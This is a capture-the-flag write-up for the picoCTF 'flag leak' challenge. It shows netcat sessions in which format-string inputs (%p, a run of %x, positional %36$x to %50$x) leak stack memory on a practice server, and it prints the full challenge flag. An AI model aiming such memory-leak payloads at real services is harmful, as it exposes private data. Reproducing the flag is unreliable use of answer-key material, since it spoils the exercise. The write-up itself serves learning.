# flag leak
**Flag: picoCTF{L34k1ng_Fl4g_0ff_St4ck_999e2824}**
## My thought process and approach to the challenge:
First I tried using `%p`
![image](https://github.com/user-attachments/assets/b58ea8ad-0416-4a87-abcd-0e88538339db)
which gave me
```
┌──(sam㉿voldermort)-[~]
└─$ nc saturn.picoctf.net 56509
Tell me a story and then I'll tell you one >> %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %P
Here's a story - 
0xffacc6f0
```
Then I tried using `%x` like:       
but that just gave me:  
![image](https://github.com/user-attachments/assets/7fbfe846-4b06-4c06-b739-aa456eba86dc)           

```
┌──(sam㉿voldermort)-[~]
└─$ nc saturn.picoctf.net 56509
Tell me a story and then I'll tell you one >> %x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x: 
Here's a story - 
ffe7ea40:ffe7ea60:8049346:253a7825:78253a78:3a78253a:253a7825:78253a78:3a78253a:253a7825:78253a78:3a78253a:253a7825:78253a78:3a78253a:253a7825:78253a78:3a78253a:253a7825:78253a78:3a78253a:253a7825:78253a78:3a78253a:253a7825:78253a78:3a78253a:253a7825:78253a78:3a78253a:253a7825:78253a78:3a78253a:253a7825:253a78:6f636970:7b465443:6b34334c:5f676e31:67346c46:6666305f:3474535f:
```
At first, all this made no sense at all to me, but looking at it further, I decided to analyze `6f636970:7b465443:6b34334c:5f676e31:67346c46:6666305f:3474535f:`            
So I tried using an online converter:
![image](https://github.com/user-attachments/assets/370ce0aa-d1bf-415a-8048-06a129c96307)
This gave me the flag but it was jumbled.     
`ocip{FTCk43L_gn1g4lFff0_4tS_` and it wasn't the full flag because it didn't have and ending `}`.          
So then I tried using `%x` more times but that also didn't work.  
![image](https://github.com/user-attachments/assets/0db3b252-00b0-4efa-aeea-d5f86576e95d)
As this was giving me the flag till the same point.            

Then I tried using:
`%36$x:%37$x:%38$x:%39$x:%40$x:%41$x:%42$x:%43$x:%44$x:%45$x:%46$x:%47$x:%48$x:%49$x:%50$x` to get more of the end part of the flag:
This gave me:
![image](https://github.com/user-attachments/assets/bf8c7f48-bdb3-4d3a-afea-ab31696bd6a6)

```
┌──(sam㉿voldermort)-[~]
└─$ nc saturn.picoctf.net 58702
Tell me a story and then I'll tell you one >> %36$x:%37$x:%38$x:%39$x:%40$x:%41$x:%42$x:%43$x:%44$x:%45$x:%46$x:%47$x:%48$x:%49$x:%50$x
Here's a story - 
6f636970:7b465443:6b34334c:5f676e31:67346c46:6666305f:3474535f:395f6b63:32653939:7d343238:fbad2000:89156900:0:ec98f990:804c000
```
putting this to the converter gave me:
![image](https://github.com/user-attachments/assets/dc8f55d5-6a4d-4e54-a522-a0d82c7a08d1)
Which was `ocip{FTCk43L_gn1g4lFff0_4tS_9_kc2e99}` the full flag but still jumbled.
after a lot of trial and error I got till
`picoCTF{L34k1ng_Fl4g_0ff_St4ck_999e2824}` which worked.



---

## Every single new concept and point of knowledge I learned or improved upon through solving the challenge.
1. **Learnt about Format String Vulnerabilities:**
   - Using `%p`, `%x`, and `%s` to leak memory data and to exploit vulnerabilities

2. **Learnt more about the memory Layout:**
   - Recognizing the importance of byte ordering when interpreting hex data.
   - Learnt how to reorder the output to make it meaningful.

3. **Hex-to-ASCII Conversion:**
   - Improved upon using online conversion tools to convert hex values to ASCII strings in order to get the flag of form picoCTF{}.

4. **Learnt how to use offset-Based Access:**
   - Learnt how to use specific offsets (`%36$x`, etc.) to navigate the stack and access data, which is important to get the flag.

5. **Improved upon Debugging:**
   - Applying trial and error to extract the complete flag.


---

##  Incorrect tangents I went on while solving :
1. **Overusing `%p`:**
   - Initially, I wasted too much time attempting `%p`, which only provided memory addresses and didn't help with the flag.

2. **Assuming Linear Output:**
   - I initially expected the flag to be fully successive, leading to unnecessary tests with `%x`, which did not prove useful and was just repetitive.

3. **Reordering Attempts:**
   - Early attempts to reorder hex data were incorrect due to misunderstandings about memory layout.
